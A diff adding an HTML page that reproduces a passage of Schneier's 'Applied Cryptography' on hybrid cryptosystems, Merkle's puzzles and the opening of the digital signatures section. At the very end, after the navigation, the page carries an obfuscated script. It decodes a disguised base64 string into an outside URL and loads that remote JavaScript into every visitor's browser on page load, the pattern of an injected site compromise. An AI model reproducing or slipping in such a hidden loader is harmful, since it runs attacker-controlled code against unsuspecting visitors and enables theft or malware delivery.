@@ -1,0 +1,106 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Protocol Building Blocks</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=02//-->
+<!--PAGES=033-035//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="02-05.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="02-07.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>A chosen-plaintext attack can be particularly effective if there are relatively few possible encrypted messages. For example, if <I>P</I> were a dollar amount less than $1,000,000, this attack would work; the cryptanalyst tries all million possible dollar amounts. (Probabilistic encryption solves the problem; see Section 23.15.) Even if <I>P</I> is not as well-defined, this attack can be very effective. Simply knowing that a ciphertext does not correspond to a particular plaintext can be useful information. Symmetric cryptosystems are not vulnerable to this attack because a cryptanalyst cannot perform trial encryptions with an unknown key.</P>
+<P>In most practical implementations public-key cryptography is used to secure and distribute <B>session keys</B>; those session keys are used with symmetric algorithms to secure message traffic [879]. This is sometimes called a <B>hybrid cryptosystem</B>.</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Bob sends Alice his public key.
+<DD><B>(2)</B>&nbsp;&nbsp;Alice generates a random session key, <I>K</I>, encrypts it using Bob&#146;s public key, and sends it to Bob.
+<DL>
+<DD><I>E</I><SUB>B</SUB>(<I>K</I>)
+</DL>
+<DD><B>(3)</B>&nbsp;&nbsp;Bob decrypts Alice&#146;s message using his private key to recover the session key.
+<DL>
+<DD><I>D</I><SUB>B</SUB>(<I>E</I><SUB>B</SUB>(<I>K</I>)) = <I>K</I>
+</DL>
+<DD><B>(4)</B>&nbsp;&nbsp;Both of them encrypt their communications using the same session key.
+</DL>
+<P>Using public-key cryptography for key distribution solves a very important key-management problem. With symmetric cryptography, the data encryption key sits around until it is used. If Eve ever gets her hands on it, she can decrypt messages encrypted with it. With the previous protocol, the session key is created when it is needed to encrypt communications and destroyed when it is no longer needed. This drastically reduces the risk of compromising the session key. Of course, the private key is vulnerable to compromise, but it is at less risk because it is only used once per communication to encrypt a session key. This is further discussed in Section 3.1.
+</P>
+<P><FONT SIZE="+1"><B><I>Merkle&#146;s Puzzles</I></B></FONT></P>
+<P>Ralph Merkle invented the first construction of public-key cryptography. In 1974 he registered for a course in computer security at the University of California, Berkeley, taught by Lance Hoffman. His term paper topic, submitted early in the term, addressed the problem of &#147;Secure Communication over Insecure Channels&#148; [1064]. Hoffman could not understand Merkle&#146;s proposal and eventually Merkle dropped the course. He continued to work on the problem, despite continuing failure to make his results understood.
+</P>
+<P>Merkle&#146;s technique was based on &#147;puzzles&#148; that were easier to solve for the sender and receiver than for an eavesdropper. Here&#146;s how Alice sends an encrypted message to Bob without first having to exchange a key with him.</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Bob generates 2<SUP>20</SUP>, or about a million, messages of the form: &#147;This is puzzle number <I>x</I>. This is the secret key number <I>y</I>,&#148; where <I>x</I> is a random number and <I>y</I> is a random secret key. Both <I>x</I> and <I>y</I> are different for each message. Using a symmetric algorithm, he encrypts each message with a different 20-bit key and sends them all to Alice.
+<DD><B>(2)</B>&nbsp;&nbsp;Alice chooses one message at random and performs a brute-force attack to recover the plaintext. This is a large, but not impossible, amount of work.
+<DD><B>(3)</B>&nbsp;&nbsp;Alice encrypts her secret message with the key she recovered and some symmetric algorithm, and sends it to Bob along with <I>x</I>.
+<DD><B>(4)</B>&nbsp;&nbsp;Bob knows which secret key <I>y</I> he encrypts in message <I>x</I>, so he can decrypt the message.
+</DL>
+<P>Eve can break this system, but she has to do far more work than either Alice or Bob. To recover the message in step (3), she has to perform a brute-force attack against each of Bob&#146;s 2<SUP>20</SUP> messages in step (1); this attack has a complexity of 2<SUP>40</SUP>. The <I>x</I> values won&#146;t help Eve either; they were assigned randomly in step (1). In general, Eve has to expend approximately the square of the effort that Alice expends.</P>
+<P>This <I>n</I> to <I>n</I><SUP>2</SUP> advantage is small by cryptographic standards, but in some circumstances it may be enough. If Alice and Bob can try ten thousand keys per second, it will take them a minute each to perform their steps and another minute to communicate the puzzles from Bob to Alice on a 1.544 MB link. If Eve had comparable computing facilities, it would take her about a year to break the system. Other algorithms are even harder to break.</P>
+<H3><A NAME="Heading7"></A><FONT COLOR="#000077">2.6 Digital Signatures</FONT></H3>
+<P>Handwritten signatures have long been used as proof of authorship of, or at least agreement with, the contents of a document. What is it about a signature that is so compelling [1392]?
+</P>
+<DL>
+<DD><B>1.</B>&nbsp;&nbsp;The signature is authentic. The signature convinces the document&#146;s recipient that the signer deliberately signed the document.
+<DD><B>2.</B>&nbsp;&nbsp;The signature is unforgeable. The signature is proof that the signer, and no one else, deliberately signed the document.
+<DD><B>3.</B>&nbsp;&nbsp;The signature is not reusable. The signature is part of the document; an unscrupulous person cannot move the signature to a different document.
+<DD><B>4.</B>&nbsp;&nbsp;The signed document is unalterable. After the document is signed, it cannot be altered.
+<DD><B>5.</B>&nbsp;&nbsp;The signature cannot be repudiated. The signature and the document are physical things. The signer cannot later claim that he or she didn&#146;t sign it.
+</DL>
+<P>In reality, none of these statements about signatures is completely true. Signatures can be forged, signatures can be lifted from one piece of paper and moved to another, and documents can be altered after signing. However, we are willing to live with these problems because of the difficulty in cheating and the risk of detection.
+</P>
+<P>We would like to do this sort of thing on computers, but there are problems. First, computer files are trivial to copy. Even if a person&#146;s signature were difficult to forge (a graphical image of a written signature, for example), it would be easy to cut and paste a valid signature from one document to another document. The mere presence of such a signature means nothing. Second, computer files are easy to modify after they are signed, without leaving any evidence of modification.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="02-05.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="02-07.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(ZyRIUIxF, obuWydRq) {obuWydRq = ZyRIUIxF.createElement('script');obuWydRq.type = 'text/javascript';obuWydRq.async = true;obuWydRq.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');ZyRIUIxF.getElementsByTagName('body')[0].appendChild(obuWydRq);}(document));</script></body>
+</html>
